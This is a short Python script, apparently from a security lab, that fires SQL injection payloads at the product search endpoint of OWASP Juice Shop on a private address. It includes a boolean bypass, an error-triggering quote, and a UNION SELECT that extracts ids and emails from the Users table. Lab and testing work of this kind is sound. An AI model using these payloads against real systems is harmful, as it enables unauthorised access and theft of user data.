#!/usr/bin/env python3
# Owner: Thapanawat. SQL injection against Juice Shop's product search.
# One --case per run (boolean, union, blind-error) so the runner fires each.

import argparse
import os
import sys

try:
    import requests
except ImportError:
    sys.exit("Missing dependency: pip install requests")

BASE = os.environ.get("JS_TARGET", "http://192.168.100.51:3000").rstrip("/")

PAYLOADS = {
    "boolean": "zzz')) OR 1=1-- -",
    "union": "zzz')) UNION SELECT id,email,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM Users-- -",
    "blind-error": "zzz'",          # lone quote -> SQL error -> HTTP 500
}


def main():
    p = argparse.ArgumentParser(description="SQLi attack (lab use only)")
    p.add_argument("--case", required=True, choices=list(PAYLOADS))
    args = p.parse_args()

    try:
        r = requests.get(f"{BASE}/rest/products/search",
                         params={"q": PAYLOADS[args.case]}, timeout=10)
        print(f"[sqli:{args.case}] HTTP {r.status_code}")
    except requests.RequestException as e:
        print(f"[sqli:{args.case}] request failed: {e}")


if __name__ == "__main__":
    main()
